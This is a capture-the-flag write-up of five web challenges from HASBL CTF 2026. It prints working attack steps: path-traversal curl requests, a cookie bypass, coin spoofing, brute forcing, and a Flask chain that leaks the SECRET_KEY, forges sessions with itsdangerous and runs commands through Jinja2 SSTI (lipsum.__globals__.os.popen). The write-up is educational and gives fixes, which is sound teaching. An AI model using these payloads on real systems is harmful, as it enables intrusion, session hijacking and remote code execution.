Platform HASBL CTF 2026

Difficulty Mixed (Easy → Hard)

OS Jeopardy — Web (HTTP, nginx, Express, Next.js, Flask)

Tags client-side auth bypass via robots.txt + cookie injection, non-iterative path-traversal filter bypass, client-trusted economy / coin spoofing, Next.js sourcemap + header reconnaissance with hint-prune brute force, Jinja2 SSTI in PDF receipts with capped-field escape via Flask SECRET_KEY leak and itsdangerous session forgery

Here at **CyberSecurity Elite** , we solved the web track of **HASBLCTF 2026** , a multi-category jeopardy event with Reverse Engineering, Pwn, Web, and Forensics tracks. This writeup is dedicated to the **Web Exploitation track** — the five web challenges (`T/I Forum`, `Anatolian Atlas`, `Arena.exe`, `Lineup Challenge`, `DTeam`) were all solved, and each one teaches a different web-attack primitive: client-side authentication theatre defeated by reading the JavaScript, non-iterative `..` traversal filters, client-trusted in-game economies, hint-collection across HTTP headers / sourcemaps / robots.txt, and a two-stage Flask SSTI chain through a PDF-receipt template.

This is the master writeup for the web track. Each challenge below covers the surface, the bug, the exploit chain, and the recovered flag. Full per-challenge reproductions — solver scripts and handout files — live in the source repository: [Abdelkad3r/hasblctf-2026](https://github.com/Abdelkad3r/hasblctf-2026).

## The web track at a glance#

Challenge| Stack| Core technique  
---|---|---  
T/I Forum| nginx static HTML + client-side JS auth| `robots.txt` → `/secret_page.html` → base64 token → cookie `admin=…` → `GET /flag.txt`  
Anatolian Atlas| Express.js + server-side sessions| Non-iterative `..` filter on `/files?path=…`; `../../flag_info.txt` walks out; recipe → flag  
Arena.exe| nginx fronting a Canvas shooter| Client-trusted economy: `{"coins": 9999999}` to `/api/buy-hint` → token → seed `-1337` → flag  
Lineup Challenge| Next.js (`X-Powered-By`, `x-nextjs-cache`)| Hints in sourcemap + `robots.txt` \+ `/secret-lineup` DOM + `X-Hint-5:` header; prune + brute  
DTeam| Flask + Werkzeug + Jinja2 PDF receipts| SSTI in 30-char username → `{{config['SECRET_KEY']}}` (24 chars) → forge session → uncapped SSTI in `last_order.name`  
  
> **Note on live endpoints.** Three of the five challenge URLs (`Arena.exe`, `Lineup Challenge`, `DTeam`) were taken offline after the event. The methodology and payloads below are reproducible against the source in the repo; the original `34.77.68.154` infrastructure is not.

## Methodology — a web checklist#

The classic _recon → enumeration → exploitation → flag_ shape carries every web challenge, but the web-specific four-step expansion is more useful:

  1. **Map the surface.** Every URL on the site, every API endpoint (look at the browser’s Network tab in DevTools), every static asset, every HTTP response header, `robots.txt`, source maps (`.js.map`), build manifests, `/.well-known/`, `/sitemap.xml`. The author’s _easter eggs_ are almost always in surfaces tools default to ignoring — robots.txt, source maps, response headers.
  2. **Identify the trust boundary.** What’s checked client-side vs server-side? Look at the JavaScript: any `if (clientSideValue === ...)` is decorative. Any value read from a server-controlled URL into a client-side check is a free constant. Any “wallet” / “level” / “score” / “VIP” stored only in `localStorage` and sent back to the server in the request body is attacker-controlled.
  3. **Bypass through the source.** Web challenges are unusual in CTFs because the source code is _fetchable_ — JS bundles, source maps, comments in HTML, and Express-style middleware all leak structure. Read the JS first; the exploit is usually documented in plain English in a sibling function.
  4. **Chain.** Two- and three-step chains are normal. T/I Forum is robots.txt → static asset → cookie → flag. DTeam is SSTI (capped) → SECRET_KEY → session forge → SSTI (uncapped). The first step in a chain often _looks_ useless on its own.


[i]

**The recurring pattern: don't trust the client (or its assertions)** Three of the five HASBL CTF 2026 web challenges (T/I Forum, Arena.exe, Lineup Challenge in part) reduce to _“the server accepts a value that the client claimed.”_ Anatolian Atlas reduces to _“the filter wasn’t applied recursively.”_ DTeam reduces to _“the template engine rendered attacker input.”_ These are five of the OWASP top-ten patterns in five different colours; the methodology to find them is the same DevTools-first reading exercise.

* * *

## T/I Forum — robots.txt → static asset → cookie → flag#

The forum’s homepage renders a public thread listing plus an `► admin / private` section with two locked threads. The locks look real:

```
    <a class="locked-thread is-locked" data-admin-link="private_internal.html"
       href="#" aria-disabled="true"><span>🔒</span><span>internal board — access denied</span></a>
    <a class="locked-thread is-locked" data-admin-link="private_flag_distribution.html"
       href="#" aria-disabled="true"><span>🔒</span><span>flag distribution thread — admin only</span></a>
```

But `href="#"` and the real target lives in `data-admin-link`, swapped in by JavaScript only after `checkAdmin()` validates a cookie. The static files behind those names are served to anyone who asks:

```
    $ for p in private_internal.html private_flag_distribution.html; do
        curl -s -o /dev/null -w "%{http_code} %s\n" "http://34.77.68.154:10201/$p"
      done
    200 private_internal.html
    200 private_flag_distribution.html
```

Both load 200 OK — but the thread bodies are dev-jokes (“Keep internal notes tight and no flag leaks”) that intentionally don’t contain the flag. The _private topics_ are decoys. The JS shows where the actual flag is gated:

```
    async function getSecretPath() {
      const res = await fetch('/robots.txt');
      return (await res.text()).match(/Disallow:\s*(\S+)/i)[1];
    }
    
    async function getAdminSecret() {
      const path = await getSecretPath();           // /secret_page.html
      const text = await (await fetch(path)).text();
      const tokenEl = new DOMParser().parseFromString(text, 'text/html')
                      .getElementById('token');
      return atob(tokenEl.textContent.trim());      // base64-decoded
    }
    
    async function checkAdmin() {
      const secret = await getAdminSecret();
      if (secret && getCookie('admin') === secret) {
        await loadFlag();   // fetch('/flag.txt')
      }
    }
```

Three URLs in chain: `/robots.txt`, then whatever is `Disallow`ed, then `/flag.txt`. The cookie check is `===` against a value the page just read from a public URL — the “secret” is the same for every visitor and is published as a static asset.

### The exploit chain#

```
    $ curl -s http://34.77.68.154:10201/robots.txt
    User-agent: *
    Disallow: /secret_page.html
    
    $ curl -s http://34.77.68.154:10201/secret_page.html | grep -oE '[A-Za-z0-9+/=]{20,}'
    c3VwZXJfc2VjcmV0X2FkbWluXzIwMjY=
    
    $ echo c3VwZXJfc2VjcmV0X2FkbWluXzIwMjY= | base64 -d
    super_secret_admin_2026
    
    $ curl -s -H 'Cookie: admin=super_secret_admin_2026' \
           http://34.77.68.154:10201/flag.txt
    HASBL{3v3n_4_B4by_C4n_Find_7h47}
```

**Flag:** `HASBL{3v3n_4_B4by_C4n_Find_7h47}` _(“even a baby can find that”)_

**Web takeaway:** `Disallow:` in `robots.txt` is a _signpost_ , not a barrier. nginx serves disallowed paths just like any other; the directive only asks well-behaved crawlers to skip them. As a security control it’s worse than nothing — it actively points attackers at the URLs you want hidden. Combine that with a client-side cookie equality check (where the “secret” is a public constant), and you have a 30-second exploit chain. **Treat`robots.txt` as a public README; put real auth on real endpoints.**

* * *

## Anatolian Atlas — non-iterative `..` filter#

```
    $ curl 'http://34.77.68.154:10202/files?path=../flag_info.txt'    # 404 Not found
    $ curl 'http://34.77.68.154:10202/files?path=../../flag_info.txt' # 200, file contents
    $ curl 'http://34.77.68.154:10202/files?path=/app/flag_info.txt'  # 200, no base-prefix check
```

The site is a Turkish restaurant rating map (18 cities pinned, Express.js backend with server-side `connect.sid` sessions). Three interesting surfaces:

  * `/files?path=…` — raw filesystem reader, used by the page to fetch `turkiye.png`.
  * `/api/restaurant/:id` — JSON for each restaurant, conditionally includes a `flag` field.
  * `/review/:id` — POST endpoint that creates a review on the authenticated user’s session.


### The path-traversal filter is non-iterative#

A single `../` is rejected; two `../../` walks through. That’s the classic _non-iterative`..` strip_ — the filter does something like `path.replace('../', '')` exactly once, which means `....//` and `../../` both end up containing a `..` after the strip. Two `..`s on input → one `..` survives the strip → directory escape.

The leaked file is a recipe:

```
    $ curl 'http://34.77.68.154:10202/files?path=../../flag_info.txt'
    RECIPE: To unlock the flag, the Kayseri restaurant needs a review with
      service = 3, food = 5, hygiene = 4, comment = "Give me the flag!"
```

### The full chain#

```
    # 1. register + login (server-side sessions)
    $ curl -c jar -d 'username=u&password=p&next=/' http://…:10202/register
    $ curl -b jar -c jar -d 'username=u&password=p&next=/' http://…:10202/login
    
    # 2. read the recipe via traversal
    $ curl -b jar 'http://…:10202/files?path=../../flag_info.txt'
    # (recipe printed above)
    
    # 3. execute the recipe
    $ curl -b jar -X POST \
           -d 'service=3&food=5&hygiene=4&comment=Give me the flag!' \
           http://…:10202/review/kayseri
    
    # 4. the flag now appears in the restaurant API
    $ curl -b jar http://…:10202/api/restaurant/kayseri | jq -r .flag
    HASBL{7urkish_F00ds_4r3_D3lici0us}
```

**Flag:** `HASBL{7urkish_F00ds_4r3_D3lici0us}`

**Web takeaway:** path-traversal filters that strip `..` once are not filters; they’re text-replacement decorations. The robust mitigation is _resolve the absolute path with`path.resolve(base, userInput)` and then verify it’s a descendant of `base`_ — not regex-match the input. The challenge’s secondary lesson is the _state-triggered flag drop_ : the flag isn’t sitting in a file, it’s gated on a database state that the attacker must produce. Read the _recipe_ , then _cook it_. Both moves are the engagement.

* * *

## Arena.exe — client-trusted economy#

A Canvas-based browser shooter. The page tracks coins / levels / high score in `localStorage`. Only three server endpoints exist:

```
    POST /api/start  {seed}        — start a run with a chosen RNG seed
    POST /api/buy-hint {coins}     — buy a hint (price 9999)
    POST /api/hint {token}         — redeem the token
```

The “challenge” is that the shop never tracks the wallet server-side — the coin amount is just sent in the request body. The 9999-coin price exists only as an `if (req.body.coins >= 9999)` check on attacker-controlled input.

### Three POSTs, no grinding#

```
    $ curl -s -X POST http://…:10206/api/buy-hint \
           -H 'Content-Type: application/json' \
           -d '{"coins": 9999999}'
    {"token":"<sha256-shaped string>"}
    
    $ curl -s -X POST http://…:10206/api/hint \
           -H 'Content-Type: application/json' \
           -d '{"token":"<that token>"}'
    {"hint":"negative leet as seed"}
    
    $ curl -s -X POST http://…:10206/api/start \
           -H 'Content-Type: application/json' \
           -d '{"seed": -1337}'
    {"status":"flag","flag":"HASBL{7his_S33d_Is_S0_Lucky}",
     "message":"You found the secret seed."}
```

`-1337` is “negative leet.” Other near-leet seeds (`-13370`, `-31337`, `1337` positive) just return `{"status":"ok", "seed": <echo>, "message":"Game starting."}` — only the exact `-1337` flips the flag-bearing branch.

**Flag:** `HASBL{7his_S33d_Is_S0_Lucky}`

**Web takeaway:** _client-trusted economies are the canonical web-CTF footgun._ Any game-style currency, “unlocked” level, or premium feature asserted by the client and accepted by the server without cross-check is the same primitive as this challenge. The fix is to keep the wallet server-side, keyed by an authenticated session identifier, and bill against it. A hint-shop that takes coins from the request body is an obvious tell — production anti-cheat signs every wallet-mutation transaction with a session token so fabricated values fail verification. The secondary lesson is _seed-as-secret is fragile_ even without the shop: the attacker can brute the obvious leet seeds (`±1337`, `±13371337`, `±31337`) in a few thousand requests, because the seed space is much smaller than the hint-shop pretends.

* * *

## Lineup Challenge — hint prune + targeted brute force#

A Next.js football lineup puzzle (`X-Powered-By: Next.js`, `x-nextjs-cache: HIT`). 4-2-3-1 formation with 11 slots, a static `/players.txt` with 50 candidate rows (`NAME,POSITION,AGE,NATIONALITY,CLUB,LEAGUE`), and a single endpoint:

```
    POST /api/submit  { "lineup": { "<slot>": "<player name>", … } }
```

Partial submissions yield position-specific errors (`"Position GK is empty"`, then `RB`, …), so you must commit a full 11-tuple per request. The only success signal is the binary `{"success": true, "flag": …}` vs `"Incorrect lineup. Keep trying!"`.

### Hint reconnaissance — four of five found#

The page advertises five hints. The reconnaissance moves needed:

Hint| Where it lives| What it locks  
---|---|---  
**#1**|  JS sourcemap at `/_next/static/chunks/app/page-….js.map` (production sourcemaps left enabled) → comment `/* HINT #1: The Goalkeeper is Polish. */`| GK = Polish → **Wojciech Szczęsny**  
**#3**| `# HINT #3:` comment line inside `/robots.txt`; same file’s `Disallow: /secret-lineup` points at hint #4| LW = Brazilian + Spanish club → **Vinicius Jr**  
**#4**|  Hidden `<span style="display:none">HINT #4: …</span>` on the Next.js route `/secret-lineup` (marked `noindex`)| CAM = German + Premier League + 23y → **Florian Wirtz**  
**#5**| `X-Hint-5:` HTTP response header set by middleware on every endpoint — visible via `curl -I`| RB = English + La Liga → **Trent Alexander-Arnold**  
**#2**|  Never located despite exhaustive probing (every chunk sourcemap, all four HTTP methods, RSC payload, 404 body, build manifest, ETag-decode, raw-socket duplicate-header inspection). Either hidden in a spot I missed or simply not required — the residual brute closes the gap.| —  
  
### Hint → CSV row collapse#

Reading `/players.txt` and applying each hint as a filter — each lands on exactly one row:

Hint| Filter| Row  
---|---|---  
#1| `POSITION=GK ∧ NATIONALITY=Poland`| Wojciech Szczęsny  
#5| `POSITION=RB ∧ NATIONALITY=England ∧ LEAGUE="La Liga"`| Trent Alexander-Arnold  
#4| `POSITION=CAM ∧ NATIONALITY=Germany ∧ LEAGUE="Premier League" ∧ AGE=23`| Florian Wirtz  
#3| `POSITION=LW ∧ NATIONALITY=Brazil ∧ CLUB ∈ Spanish clubs`| Vinicius Jr  
  
Raphinha is Brazilian but registered as RW; that’s the LW/RW disambiguation the hint quietly relies on.

### Brute the residual#

Seven slots remain: `CB1, CB2, LB, CDM1, CDM2, RW, ST`. Candidate pools after the slot-match filter:

  * CB pool of 6 → `P(6, 2) = 30` ordered (CB1, CB2) pairs
  * CDM pool of 4 → `P(4, 2) = 12` ordered (CDM1, CDM2) pairs
  * LB pool of 3, RW pool of 4, ST pool of 3


Total: `30 × 12 × 3 × 4 × 3 = 12 960` ordered tuples. With 30 concurrent POSTs the correct combination lands in ~1 second (combo #13 in the actual run — the “current best XI” guess fires nearly first).

```
    GK: Szczęsny   RB: Trent           CB1: van Dijk   CB2: Saliba
    LB: T. Hernandez   CDM1: Rodri     CDM2: Tchouaméni   CAM: Wirtz
    RW: Saka       LW: Vinicius Jr     ST: Haaland
```

### Flag-string mismatch — both spellings documented#

`POST /api/submit` returns `HASBL{7his_734m_C4n_Win_Ch4mpi0ns_L34gu3}` byte-for-byte on the correct lineup, but the CTF platform accepted only the heavily-leeted form `HASBL{7h1s_734m_C4n_W1n_Ch4mp10ns_L34gu3}` (every `i` → `1`). Both spellings are documented here; the leet form is the one that scored.

**Flag:** `HASBL{7h1s_734m_C4n_W1n_Ch4mp10ns_L34gu3}`

**Web takeaway:** _production sourcemaps are reconnaissance gold._ Next.js / Webpack / Vite ship `.js.map` files by default if you don’t explicitly disable them in `next.config.js` / `webpack.config.js` — and those maps include the original comments, variable names, and file paths. The same goes for `robots.txt` (`Disallow:` is a signpost), HTTP response headers (middleware-set headers leak to every endpoint), and DOM-hidden content (display:none does not hide from the source). The _combined_ surface of these four channels is the application’s spec. If you’re shipping a web app, treat the reconnaissance surface as a feature you control deliberately, not a default.

* * *

## DTeam — two-stage Flask SSTI through PDF receipts#

A Steam-styled game store (the dev didn’t even rename the CSS variables — `--steam-blue`, `--steam-dark`, `--steam-light`, `--steam-green`). Flask + Werkzeug 3.1.8 + Python 3.9.25, **running as root**. Register, log in, redeem gift codes, fill a cart, checkout, download a PDF receipt for each order.

### Step 1 — recognise the SSTI sink#

The PDF receipt’s _“Customer Account:”_ field renders the username through Jinja2 without escaping. Register with username `aaaaa{{7*7}}` (10 chars, fits the 30-char username cap), place any order, hit `/download_invoice`:

```
    Customer Account: aaaaa49
```

The username is _evaluated_ as a Jinja2 template, not just printed. Classic SSTI sink.

### Step 2 — bypass the 30-character cap with `{{config['SECRET_KEY']}}`#

The 30-char username cap blocks fool-proof RCE chains. `{{ ''.__class__.__mro__[2].__subclasses__()[…]…}}` is far too long. But the shortest useful payload fits with room to spare:

```
    {{config['SECRET_KEY']}}          24 characters
```

Register that as your username, place an order, download the receipt — the PDF’s “Customer Account:” line prints the raw bytes of the Flask session key:

```
    b'\xd2\x0e\x80_\xf8\x88\xfc\x8e\x0fH\xd8\x16\x9b\x15F\x8e\xf6q\xd1yl\xb6uV'
```

**24 random bytes.** With those, every Flask session is forgeable.

### Step 3 — find the uncapped sink#

Probing the receipt template for additional render hooks with the username `{{config.r.environ}}` (which evaluates `request.environ`) leaks the HTTP cookie of a _concurrent user’s_ session — including a decoded `last_order` shaped like:

```
    {"last_order":[{"name":"League of Noobs","price":0.0}], "user_id":10943}
```

So the PDF template iterates `session.last_order` and renders each item’s `name` _through Jinja2 with no length cap and no`|escape`_. That’s the keyhole.

### Step 4 — forge the session with `itsdangerous`#

Flask sessions are signed with `itsdangerous.URLSafeTimedSerializer` over a `TaggedJSONSerializer` payload. With the leaked SECRET_KEY:

```
    from itsdangerous import URLSafeTimedSerializer
    from flask.sessions import TaggedJSONSerializer
    
    s = URLSafeTimedSerializer(
        SECRET_KEY,
        salt="cookie-session",
        serializer=TaggedJSONSerializer(),
        signer_kwargs={"key_derivation": "hmac", "digest_method": "sha1"},
    )
    
    payload = {
        "user_id": <ours>,
        "last_order": [{
            "name": "{{lipsum.__globals__.os.popen('cat /flag.txt').read()}}",
            "price": 99.99
        }],
    }
    
    cookie = s.dumps(payload)
```

Set the `session` cookie to the forged value, GET `/download_invoice`, and the PDF prints:

```
    HASBL{7his_W3bsi73_L00ks_S0_F4mili4r}
```

`{{lipsum.__globals__.os.popen(...).read()}}` is the **classic Jinja2 RCE chain via`lipsum`**: `lipsum` is a Jinja2 globals function whose `__globals__` dict contains `os`, from which `os.popen(cmd).read()` runs arbitrary shell. Other classic chains (`cycler`, `joiner`) work identically; `lipsum` is the shortest in this template.

### A red herring: the gift-code race#

`POST /codes` redeems a gift code into the wallet. The redeem path isn’t atomic — pre-build ~500 sockets, fire in <100ms, and the same `DTEAM-XXXX` code redeems 34× → $20 code → $680 wallet. That’s a classic store race-condition, useful for buying GTA7 in-app, but **not the flag path**. The flag is not behind a paid item.

**Flag:** `HASBL{7his_W3bsi73_L00ks_S0_F4mili4r}` _(“this website looks so familiar”)_

**Web takeaway:** **Jinja2 SSTI in PDF generation is a recurring class of bug.** PDF receipt templates often render _user-controlled fields_ (names, addresses, order line items) through the same template engine that renders the HTML, but with different XSS-protection settings. `xhtml2pdf`, `WeasyPrint`, `pdfkit`, and `ReportLab` all have flavours of this — the HTML-version uses `|escape` filters, the PDF-version forgets to. The challenge stacks this with a SECRET_KEY leak to escape the 30-char username cap. **Always set`autoescape=True` on every Jinja environment, including the one you use for PDF templates.** And keep SECRET_KEY out of any user-rendered context — `config['SECRET_KEY']` should not be reachable from any template the user can influence.

* * *

## Lessons learned — what HASBLCTF 2026 web rewarded#

Five patterns recur across these five solves; they generalise to most web-track CTFs:

  1. **The reconnaissance surface includes channels tools default to ignoring.** `robots.txt`, source maps, response headers (`X-Hint-5`, `X-Powered-By`, `x-nextjs-cache`), DOM hidden via `display:none`, build manifests, `.well-known`. Tools like Burp’s _Sitemap_ tab and `gobuster` find one slice; the other slices require reading the JS the browser actually loaded.
  2. **Trust boundaries are documented in the source code itself.** T/I Forum’s JS literally chains `robots.txt → /secret_page.html → cookie compare` in a 12-line function. Arena.exe’s three endpoints are advertised in a `fetch()` block. If you read the JS first, you save yourself an hour of black-box probing.
  3. **Client-trusted values are always the answer when present.** Coins in the request body, “admin” cookies whose value the client computed, levels stored in `localStorage`, premium flags asserted by the front-end. The fix is server-side state keyed by a signed session token; the bug is the absence of that.
  4. **Filter bypass classes are catalogued.** Path-traversal filters that strip `..` once → use `..//` or `../../`. SQL filters that strip keywords followed by whitespace → use parentheses. XSS filters that strip `script` → use `onerror`. Each filter’s exact pattern dictates its bypass.
  5. **SSTI lives behind PDF templates, not just HTML.** PDF generation libraries reuse the application’s template engine but often skip `autoescape`. The two-stage chain — leak `SECRET_KEY` through a length-capped SSTI sink, then forge the session and hit the uncapped sink — is reusable on every Flask app whose PDF receipts render `last_order` items as Jinja2.

The repo also contains the [reverse engineering](https://cybersecurityelite.com/ctf-writeups/hasblctf-2026-reverse-engineering-writeup/), [pwn](https://cybersecurityelite.com/ctf-writeups/hasblctf-2026-pwn-writeup/), [forensics](https://cybersecurityelite.com/ctf-writeups/hasblctf-2026-forensics-writeup/), and [crypto](https://cybersecurityelite.com/ctf-writeups/hasblctf-2026-crypto-writeup/) writeups from the same event. This article is scoped to the web category only.

If you’re building a web-exploitation learning progression from this writeup, the five challenges form a clean order: **T/I Forum (recon + client-side bypass) → Arena.exe (client-trusted economy) → Anatolian Atlas (filter bypass + state-triggered flag) → Lineup Challenge (multi-channel recon + brute force) → DTeam (two-stage SSTI + session forgery)**. That order maps to _“read the JS”_ → _“don’t trust the client”_ → _“defeat the filter”_ → _“combine every reconnaissance channel”_ → _“chain two SSTI sinks through a forged session.”_

What is HASBL CTF 2026?

HASBL CTF 2026 is a multi-category jeopardy-style capture-the-flag competition covering Reverse Engineering, Pwn, Web, Forensics, and Crypto. The flag prefix is HASBL{…} for every challenge in the event. This writeup is dedicated to the Web Exploitation track only.

How many web challenges does HASBL CTF 2026 have?

Five web challenges, all solved in this writeup: T/I Forum, Anatolian Atlas, Arena.exe, Lineup Challenge, and DTeam. The full event also includes reverse engineering, pwn, forensics, and crypto tracks covered separately.

Where can I find the HASBL CTF 2026 web solver scripts?

All five per-challenge writeups and solver scripts live in the source repository at github.com/Abdelkad3r/hasblctf-2026 under the web/ directory. Each challenge has its own README and standalone solver.

How is the T/I Forum challenge solved?

Three layers, all client-side theatre. Read robots.txt — it lists Disallow: /secret_page.html, which is publicly fetchable. The page contains a base64 token c3VwZXJfc2VjcmV0X2FkbWluXzIwMjY= that decodes to super_secret_admin_2026. The site’s checkAdmin() JavaScript compares the admin cookie to that exact value, and a successful match makes the client call /flag.txt. Set Cookie: admin=super_secret_admin_2026, GET /flag.txt, and the flag HASBL{3v3n_4_B4by_C4n_Find_7h47} comes back.

How is the Anatolian Atlas path traversal exploited?

The /files?path=… endpoint applies a non-iterative ../ strip — one pass of replace(’../’, ‘’) removes a single ../, so ../flag_info.txt is blocked but ../../flag_info.txt walks out. The leaked file is a recipe naming a specific Kayseri restaurant review (service=3, food=5, hygiene=4, comment=‘Give me the flag!’). After registering, logging in, and posting that exact review to /review/kayseri, GET /api/restaurant/kayseri returns the flag HASBL{7urkish_F00ds_4r3_D3lici0us}.

What is a non-iterative path traversal filter?

A filter that strips ../ from the input exactly once instead of in a loop. Single-pass filters are defeated by paths that, after one ../ is removed, still contain another ../. Examples: ….//, …/./, ../../. The robust mitigation is to call path.resolve(base, userInput) and verify the result is a descendant of base — not to text-replace the input. HASBL CTF 2026’s Anatolian Atlas illustrates the bug exactly.

How is the Arena.exe shooter beaten without playing?

The Canvas-based browser shooter stores coins, levels, and high score in localStorage and sends them in the request body. POST /api/buy-hint with {coins: 9999999} returns a hint token without checking any server-side wallet. POST /api/hint with that token returns ’negative leet as seed.’ POST /api/start with {seed: -1337} returns the flag HASBL{7his_S33d_Is_S0_Lucky}. The grind is decoration; the seed is hardcoded to -1337.

How is the Lineup Challenge solved?

Four of five hints are reachable: HINT #1 from the Next.js sourcemap (Polish GK = Szczęsny), HINT #3 from a robots.txt comment (Brazilian LW in Spain = Vinicius), HINT #4 from a display:none span on /secret-lineup (German CAM age 23 in PL = Wirtz), HINT #5 from an X-Hint-5 response header set by middleware (English RB in La Liga = Trent). Those four hints uniquely identify four of eleven slots from the /players.txt CSV. Brute-forcing the remaining seven slots’ candidate pools (CB × 30, CDM × 12, LB × 3, RW × 4, ST × 3 = 12,960 ordered tuples) with 30 concurrent POSTs lands the correct combination in about a second. Flag: HASBL{7h1s_734m_C4n_W1n_Ch4mp10ns_L34gu3}.

How does the DTeam SSTI chain work?

Two stages. First, the PDF receipt template renders the user’s username through Jinja2 with no escape — a 30-char cap blocks most chains, but {{config[‘SECRET_KEY’]}} fits at 24 characters and leaks Flask’s 24-byte session signing key. Second, the same PDF template renders session.last_order items’ name field through Jinja2 with no length cap. Using the leaked SECRET_KEY plus itsdangerous, forge a session whose last_order[0].name is {{lipsum.**globals**.os.popen(‘cat /flag.txt’).read()}}. GET /download_invoice and the PDF prints HASBL{7his_W3bsi73_L00ks_S0_F4mili4r}.

What is the lipsum.__globals__.os.popen SSTI chain?

A classic Jinja2 RCE primitive. The Jinja2 globals function `lipsum` is implemented in Python; its `__globals__` attribute exposes the module’s globals dict, which includes the `os` module. From there, `os.popen(cmd).read()` runs arbitrary shell and returns its stdout. The full chain `{{lipsum.__globals__.os.popen('id').read()}}` is shorter than the `__class__.__mro__[2].__subclasses__()` chain and works in any Jinja2 environment where lipsum is available. `cycler` and `joiner` work identically.

Are HASBL CTF web challenges beginner-friendly?

Mixed. T/I Forum is the simplest — read robots.txt, read the JS, set a cookie, GET the flag — and teaches the canonical ‘client-side checks are decorative’ lesson. Arena.exe is similarly approachable (three POSTs, no grinding). Anatolian Atlas needs comfort with HTTP sessions and the path-traversal filter pattern. Lineup Challenge rewards Next.js / sourcemap reconnaissance plus a small brute-force script. DTeam is the most advanced — two-stage SSTI through PDF receipts, plus session forgery with itsdangerous, requires familiarity with Flask internals.

What tools should I use for HASBL CTF web challenges?

Browser DevTools (Network, Sources, Application/Storage tabs), curl, and Python. For T/I Forum and Arena.exe, plain curl plus jq for JSON inspection is enough. For Anatolian Atlas, curl with a cookie jar (-c jar -b jar). For Lineup Challenge, a small Python script for the brute-force loop (concurrent.futures.ThreadPoolExecutor with 30 workers). For DTeam, install itsdangerous and flask to import TaggedJSONSerializer for the session-cookie forgery. No commercial tooling required; Burp Suite Community Edition is helpful for the recon phase but isn’t essential.
